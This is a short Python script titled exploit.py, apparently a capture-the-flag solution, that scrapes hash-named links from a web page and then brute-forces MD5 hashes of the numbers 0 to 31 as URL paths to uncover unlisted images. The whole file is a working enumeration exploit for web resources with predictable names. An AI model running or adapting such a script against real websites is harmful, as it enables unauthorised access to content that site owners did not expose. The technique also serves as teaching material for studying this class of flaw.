#!/usr/bin/env python3

import hashlib # helps us in generating MD5 hashes
import requests # helps us to make HTTP requests to the website
import re # helps us perform regular expressions and try to match to a specific dataset and see if itâ€™s get a successful response
import sys

if len(sys.argv) != 2:
    print("[*] python3 exploit.py [URL]")
    sys.exit(1)

def main():
    url = sys.argv[1]
    print("[+] Retriving all the hashes present in the page...")
    hashes = requests.get(f"{url}/").text # Making the request to the site
    collection = re.findall('" href="(.*?)" coords="', hashes, re.DOTALL) # performing the regular expression
    known = collection[1:]
    print("[+] Please be patient as we generate the MD5 hashes...")
    for i in range(0,32):
        number = str(i).encode()
        created_hash = hashlib.md5(number).hexdigest() # creating the md5 hash
        if created_hash not in collection:
            image = requests.get(f"{url}/{created_hash}")
            if image.status_code != 404:
                print(f"[+] We've found a new image, here's the hash: {created_hash}")
        else:
            print("[*] Skipping hash already in collection")

if __name__ == ("__main__"):
    main()
